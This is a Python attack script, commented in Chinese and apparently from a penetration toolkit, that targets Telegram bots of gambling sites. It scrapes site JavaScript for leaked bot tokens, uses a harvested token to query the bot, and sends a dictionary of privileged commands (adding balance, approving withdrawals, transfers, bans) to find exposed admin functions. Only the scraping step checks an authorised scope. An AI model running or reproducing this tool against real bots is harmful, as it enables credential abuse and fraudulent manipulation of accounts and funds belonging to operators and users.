#!/usr/bin/env python3
"""TG Bot 管理指令枚举 — 博彩站专项。

博彩站 TG Bot 经常把管理员指令暴露给所有用户：
  /balance uid=1234   ← 查任意用户余额
  /bonus uid=1234 amount=500  ← 给用户加彩金
  /setlevel uid=1234 level=vip  ← 提升会员等级
  /transfer amount=100 to=888  ← 划转资金

只要枚举出这些指令，不需要打后台，直接操作业务逻辑。

示例:
  python3 炼蛊房/tg_cmd_enum.py doctor
  python3 炼蛊房/tg_cmd_enum.py enum \
    --bot-token <BOT_TOKEN> --case <案卷>
  python3 炼蛊房/tg_cmd_enum.py probe \
    --bot-token <BOT_TOKEN> --chat-id <CHAT_ID> --case <案卷>
  python3 炼蛊房/tg_cmd_enum.py find-bots \
    --site-domain target.com --case <案卷>
"""
from __future__ import annotations
import argparse
import json
import re
import sys
import time
from datetime import datetime, UTC
from pathlib import Path

try:
    import requests
    requests.packages.urllib3.disable_warnings()  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ENGINE = Path(__file__).resolve().parents[1]
OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope  # noqa: E402

TG_API = "https://api.telegram.org/bot{token}/{method}"

def _now(): return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "tg_bot"
    d.mkdir(parents=True, exist_ok=True)
    return d

# 博彩站 TG Bot 高频管理指令字典
GAMBLING_CMDS = [
    # 通用查询
    "/start", "/help", "/menu", "/commands",
    # 余额/账户
    "/balance", "/bal", "/wallet", "/account",
    "/balance {uid}", "/checkbalance", "/getbalance",
    "/userinfo", "/userinfo {uid}", "/info", "/info {uid}",
    # 财务操作（高价值）
    "/addbalance {uid} {amount}", "/addbonus {uid} {amount}",
    "/deduct {uid} {amount}", "/setbalance {uid} {amount}",
    "/recharge {uid} {amount}", "/topup {uid} {amount}",
    "/transfer {amount} {uid}", "/send {amount} {uid}",
    "/pay {uid} {amount}",
    # 会员等级
    "/setlevel {uid} {level}", "/upgradeuser {uid}",
    "/vip {uid}", "/setvip {uid} {level}",
    "/memberupgrade {uid}", "/setgroup {uid} {group}",
    # 提现/出金
    "/withdraw", "/withdrawal", "/cashout",
    "/approvewithdraw {order_id}", "/rejectwithdraw {order_id}",
    "/checkwithdraw", "/listwithdraw",
    # 存款
    "/deposit", "/checkdeposit", "/confirmdeposit {order_id}",
    "/approvedeposit {order_id}",
    # 管理操作
    "/ban {uid}", "/unban {uid}", "/freeze {uid}", "/unfreeze {uid}",
    "/reset {uid}", "/kick {uid}",
    "/adduser", "/createuser", "/register",
    # 系统
    "/stats", "/report", "/daily", "/weekly",
    "/online", "/onlinecount",
    "/broadcast {msg}", "/announce {msg}",
    # 博彩站专用
    "/order", "/orders", "/orderlist",
    "/game", "/gamelist", "/betlist",
    "/agent", "/agentinfo", "/agentbalance",
    "/commission", "/profit",
    # 中文指令（某些中国博彩站）
    "/查询", "/余额", "/充值", "/提现", "/转账",
    "/加款", "/扣款", "/封号", "/解封",
]

# 从网站/APK 中找到 TG Bot Token 的正则
BOT_TOKEN_RE = re.compile(r'\b(\d{8,12}:[A-Za-z0-9_-]{35})\b')
BOT_USERNAME_RE = re.compile(r'@([A-Za-z0-9_]{5,32}[Bb][Oo][Tt])', re.I)

def tg_call(token: str, method: str, **kwargs) -> dict:
    if not HAS_REQUESTS:
        return {"ok": False, "error": "requests not installed"}
    try:
        url = TG_API.format(token=token, method=method)
        r = requests.post(url, json=kwargs, timeout=15, verify=False)
        return r.json()
    except Exception as exc:
        return {"ok": False, "error": str(exc)}

def cmd_doctor(_: argparse.Namespace) -> int:
    print(f"[{'ok' if HAS_REQUESTS else 'missing'}] requests")
    print(f"[ok] {len(GAMBLING_CMDS)} gambling bot commands in dictionary")
    # 测试 TG API 连通性
    try:
        import requests as rq
        r = rq.get("https://api.telegram.org", timeout=5)
        print(f"[ok] TG API reachable: {r.status_code}")
    except Exception as e:
        print(f"[warn] TG API: {e}")
    print("[ok] tg_cmd_enum ready")
    return 0

def cmd_enum(args: argparse.Namespace) -> int:
    """枚举 Bot 的 /getMyCommands 和实际指令响应。"""
    token = args.bot_token
    # 验证 token
    me = tg_call(token, "getMe")
    if not me.get("ok"):
        raise SystemExit(f"[err] invalid token: {me.get('description')}")
    bot_info = me["result"]
    print(f"[*] Bot: @{bot_info['username']} ({bot_info.get('first_name','')})")
    print(f"    id={bot_info['id']}  can_join_groups={bot_info.get('can_join_groups')}")

    # 获取 Bot 已配置的指令列表
    cmds_result = tg_call(token, "getMyCommands")
    registered_cmds = []
    if cmds_result.get("ok") and cmds_result.get("result"):
        registered_cmds = cmds_result["result"]
        print(f"\n[*] Bot 注册的指令 ({len(registered_cmds)} 个):")
        for c in registered_cmds:
            print(f"  /{c['command']} — {c.get('description','')}")

    out = case_dir(args.case)
    report = {
        "ts": _now(),
        "bot": bot_info,
        "registered_commands": registered_cmds,
        "token_fragment": token[:10] + "...",
    }
    (out / "bot_info.json").write_text(
        json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[+] → {out / 'bot_info.json'}")

    if not registered_cmds:
        print("\n[!] Bot 未配置公开指令 — 但可能有未公开的管理员指令")
        print("[hint] 获取 chat_id 后运行 probe 子命令实际测试指令")
    return 0

def cmd_probe(args: argparse.Namespace) -> int:
    """实际向 Bot 发送指令，观察响应，识别管理员功能。"""
    token = args.bot_token
    chat_id = args.chat_id

    me = tg_call(token, "getMe")
    if not me.get("ok"):
        raise SystemExit("[err] invalid token")

    print(f"[*] probing {len(GAMBLING_CMDS)} commands …", flush=True)
    findings = []
    errors = []

    for cmd_template in GAMBLING_CMDS:
        # 替换模板占位符为测试值
        cmd = cmd_template.replace("{uid}", "1").replace("{amount}", "1") \
                          .replace("{order_id}", "1").replace("{level}", "vip") \
                          .replace("{group}", "1").replace("{msg}", "test")

        # 发送消息
        send_result = tg_call(token, "sendMessage", chat_id=chat_id, text=cmd)
        if not send_result.get("ok"):
            errors.append(cmd)
            continue
        msg_id = send_result["result"]["message_id"]
        time.sleep(1.5)  # 等待 Bot 响应

        # 获取近期 updates，找 Bot 发回的消息
        # 注意：Bot 自己发的消息不会出现在 getUpdates 里；
        # 这里改为：拉最新 updates，找同一 chat 里 Bot 作为 from 发来的消息
        # （适用于 Bot 同时也作为普通用户在某些 API 实现里的情况）
        updates = tg_call(token, "getUpdates", offset=-10, limit=10)
        bot_replies = []
        if updates.get("ok"):
            for upd in updates.get("result", []):
                msg = upd.get("message") or upd.get("edited_message") or {}
                from_id = msg.get("from", {}).get("id")
                try:
                    chat_id_int = int(chat_id)
                except (ValueError, TypeError):
                    chat_id_int = None
                chat_match = (chat_id_int is not None and
                              msg.get("chat", {}).get("id") == chat_id_int)
                if chat_match and msg.get("text"):
                    bot_replies.append(msg.get("text", ""))

        # getUpdates 不返回 Bot 自己发的消息；实际响应需在 TG 客户端人工观察。
        # 此处记录发送结果，仅标注"已发送"，人工判断响应。
        entry = {
            "cmd": cmd_template,
            "sent": cmd,
            "msg_id": msg_id,
            "reply": "(人工在TG客户端查看Bot响应)",
            "meaningful": None,
        }
        if bot_replies:
            # 如果 API 实现返回了回复则记录
            entry["reply"] = bot_replies[-1][:200]
            unknown_patterns = ["unknown command", "不支持", "无效", "error", "invalid",
                                 "sorry", "不存在", "没有", "/help"]
            entry["meaningful"] = not any(
                p.lower() in entry["reply"].lower() for p in unknown_patterns)
        findings.append(entry)
        print(f"  [sent] [{cmd_template}]  msg_id={msg_id}")
        time.sleep(0.5)

    meaningful = [f for f in findings if f.get("meaningful")]
    out = case_dir(args.case)
    report = {
        "ts": _now(), "chat_id": chat_id,
        "total_probed": len(GAMBLING_CMDS),
        "responded": len(findings),
        "meaningful": len(meaningful),
        "findings": findings,
    }
    out_json = out / "cmd_probe.json"
    out_json.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"\n[result] {len(findings)} 条指令已发送，{len(meaningful)} 个检测到有意义响应 → {out_json}")
    print("[hint] TG Bot 响应需在 Telegram 客户端人工查看，tool 只记录发送结果")
    return 0 if findings else 1

def cmd_find_bots(args: argparse.Namespace) -> int:
    """从站点 JS/APK 中提取 TG Bot Token / Username。"""
    if not HAS_REQUESTS:
        raise SystemExit("[err] requests not installed")

    domain = host_of(args.site_domain)
    if not in_scope(domain):
        raise SystemExit(f"[scope] {domain} 不在授权范围")

    base = f"https://{domain}"
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = "Mozilla/5.0"
    sess.verify = False

    found_tokens = set()
    found_usernames = set()

    # 抓主页 + 常见 JS 路径
    urls_to_check = [base, f"{base}/index.html", f"{base}/app.js",
                     f"{base}/static/js/app.js", f"{base}/js/app.js"]
    for url in urls_to_check:
        try:
            r = sess.get(url, timeout=10, allow_redirects=True)
            text = r.text
            found_tokens.update(BOT_TOKEN_RE.findall(text))
            found_usernames.update(BOT_USERNAME_RE.findall(text))
            # 抓内联 JS src
            for js_src in re.findall(r'<script[^>]+src="([^"]+\.js[^"]*)"', text):
                js_url = js_src if js_src.startswith("http") else base + "/" + js_src.lstrip("/")
                try:
                    jr = sess.get(js_url, timeout=10)
                    found_tokens.update(BOT_TOKEN_RE.findall(jr.text))
                    found_usernames.update(BOT_USERNAME_RE.findall(jr.text))
                except Exception:
                    pass
        except Exception:
            pass

    out = case_dir(args.case)
    result = {
        "ts": _now(), "domain": domain,
        "tokens": list(found_tokens),
        "usernames": list(found_usernames),
    }
    (out / "bot_discovery.json").write_text(
        json.dumps(result, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[result] tokens={found_tokens} usernames={found_usernames}")
    if found_tokens:
        print("\n[next] python3 炼蛊房/tg_cmd_enum.py enum --bot-token <TOKEN> --case CASE")
    return 0

def main() -> int:
    p = argparse.ArgumentParser(description="TG Bot 管理指令枚举（博彩站专项）")
    sub = p.add_subparsers(dest="cmd", required=True)

    d = sub.add_parser("doctor"); d.set_defaults(func=cmd_doctor)

    en = sub.add_parser("enum", help="枚举 Bot 注册指令")
    en.add_argument("--bot-token", required=True)
    en.add_argument("--case", required=True)
    en.set_defaults(func=cmd_enum)

    pr = sub.add_parser("probe", help="实际发送指令测试权限")
    pr.add_argument("--bot-token", required=True)
    pr.add_argument("--chat-id", required=True)
    pr.add_argument("--case", required=True)
    pr.set_defaults(func=cmd_probe)

    fb = sub.add_parser("find-bots", help="从站点 JS 提取 Bot Token")
    fb.add_argument("--site-domain", required=True)
    fb.add_argument("--case", required=True)
    fb.set_defaults(func=cmd_find_bots)

    args = p.parse_args()
    return int(args.func(args) or 0)

if __name__ == "__main__":
    raise SystemExit(main())
